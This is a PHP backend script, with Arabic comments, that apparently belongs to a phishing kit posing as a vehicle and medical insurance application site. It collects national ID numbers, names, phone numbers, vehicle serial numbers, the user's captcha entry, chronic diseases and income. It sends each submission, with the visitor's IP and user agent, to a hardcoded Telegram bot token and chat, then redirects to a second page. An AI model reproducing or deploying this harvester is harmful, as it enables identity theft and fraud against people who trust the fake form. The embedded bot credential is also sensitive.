<?php
// tele/index.php
declare(strict_types=1);
mb_internal_encoding('UTF-8');

// --- إعدادات تيلجرام (حسب ما أرسلت) ---
$BOT_TOKEN = '7910223326:AAGB_WRgVyXMqgEkb-iRCUQkAH14zLbwwcE';
$CHAT_ID   = '8407843143';
$API_URL   = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";

// دوال مساعدة صغيرة
$param = function(string $key, $default = '') {
    if (!isset($_POST[$key])) return $default;
    $val = $_POST[$key];
    return is_string($val) ? trim($val) : (is_array($val) ? json_encode($val, JSON_UNESCAPED_UNICODE) : (string)$val);
};
$safe = function(string $v) {
    // ترميز بسيط متوافق مع parse_mode=HTML
    $v = str_replace(['&','<','>'], ['&amp;','&lt;','&gt;'], $v);
    return $v;
};

// معلومات تقنية
$ip   = $_SERVER['REMOTE_ADDR']       ?? '';
$ua   = $_SERVER['HTTP_USER_AGENT']   ?? '';
$host = $_SERVER['HTTP_HOST']         ?? '';
$when = date('Y-m-d H:i:s');

// تحديد نوع النموذج
$form_type      = $param('form_type', 'vehicle'); // vehicle | medical
$insurance_type = $param('insurance_type', '');   // new | transfer (للمركبات)
$document_type  = $param('document_type', '');    // form | customs (للمركبات)

// بناء الرسالة
$lines   = [];
$lines[] = "🟧 <b>وصول نموذج جديد</b>";
$lines[] = "النوع: <b>{$safe($form_type)}</b>";

if ($form_type === 'vehicle') {
    if ($insurance_type !== '') {
        $lines[] = "نوع التأمين: <b>{$safe($insurance_type)}</b>";
    }
    if ($document_type !== '') {
        $lines[] = "نوع المستند: <b>{$safe($document_type)}</b>";
    }

    if ($insurance_type === 'transfer') {
        $seller_id   = $param('seller_id');
        $buyer_id    = $param('buyer_id');
        $full_name_t = $param('full_name_transfer');
        $phone_t     = $param('phone_number_transfer');

        if ($seller_id !== '')   $lines[] = "هوية البائع: <code>{$safe($seller_id)}</code>";
        if ($buyer_id !== '')    $lines[] = "هوية المشتري: <code>{$safe($buyer_id)}</code>";
        if ($full_name_t !== '') $lines[] = "الاسم الكامل: {$safe($full_name_t)}";
        if ($phone_t !== '')     $lines[] = "الهاتف: <code>{$safe($phone_t)}</code>";
    } else {
        // new (تأمين جديد) - الافتراضي
        $id_number  = $param('id_number');
        $full_name  = $param('full_name');
        $phone      = $param('phone_number');

        if ($id_number !== '') $lines[] = "رقم الهوية/الإقامة: <code>{$safe($id_number)}</code>";
        if ($full_name !== '') $lines[] = "الاسم الكامل: {$safe($full_name)}";
        if ($phone !== '')     $lines[] = "الهاتف: <code>{$safe($phone)}</code>";
    }

    if ($document_type === 'customs') {
        $year_c  = $param('manufacturing_year');
        $sn_c    = $param('serial_number_customs');
        if ($year_c !== '') $lines[] = "سنة الصنع: <code>{$safe($year_c)}</code>";
        if ($sn_c !== '')   $lines[] = "الرقم التسلسلي (جمرك): <code>{$safe($sn_c)}</code>";
    } else {
        $sn = $param('serial_number');
        if ($sn !== '') $lines[] = "الرقم التسلسلي (استمارة): <code>{$safe($sn)}</code>";
    }

    $captcha_in = $param('captcha_input');
    if ($captcha_in !== '') $lines[] = "رمز التحقق المدخل: <code>{$safe($captcha_in)}</code>";

} elseif ($form_type === 'medical') {
    $coverage = $param('coverage_type');
    $age      = $param('age');
    $gender   = $param('gender');
    $status   = $param('social_status');
    $chronic  = $param('chronic_diseases');
    $network  = $param('hospital_network');
    $income   = $param('monthly_income');

    if ($coverage !== '') $lines[] = "نوع التغطية: <b>{$safe($coverage)}</b>";
    if ($age !== '')      $lines[] = "العمر: <code>{$safe($age)}</code>";
    if ($gender !== '')   $lines[] = "الجنس: <b>{$safe($gender)}</b>";
    if ($status !== '')   $lines[] = "الحالة الاجتماعية: <b>{$safe($status)}</b>";
    if ($chronic !== '')  $lines[] = "أمراض مزمنة: <b>{$safe($chronic)}</b>";
    if ($network !== '')  $lines[] = "شبكة المستشفيات: <b>{$safe($network)}</b>";
    if ($income !== '')   $lines[] = "الدخل الشهري: <b>{$safe($income)}</b>";
}

// ذيل الرسالة
$lines[] = "الوقت: <b>{$safe($when)}</b>";

// تحويل لمحتوى نصي
$message = implode("\n", $lines);

// إرسال إلى تيلجرام (دون أي منطق منع تكرار — كل نقرة تُرسل)
try {
    $payload = [
        'chat_id'                  => $CHAT_ID,
        'text'                     => $message,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true,
    ];

    $ch = curl_init($API_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/x-www-form-urlencoded; charset=UTF-8'],
        CURLOPT_POSTFIELDS     => http_build_query($payload),
    ]);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    // بإمكانك طباعة الأخطاء أثناء التطوير فقط
    // if ($err) { error_log("Telegram error: ".$err); }
} catch (Throwable $e) {
    // أثناء التطوير فقط
    // error_log("Exception: ".$e->getMessage());
}

// إعادة توجيه بعد الإرسال (PRG) لتجنب الإرسال عند تحديث الصفحة
header('Location: ../index2.html');
exit;
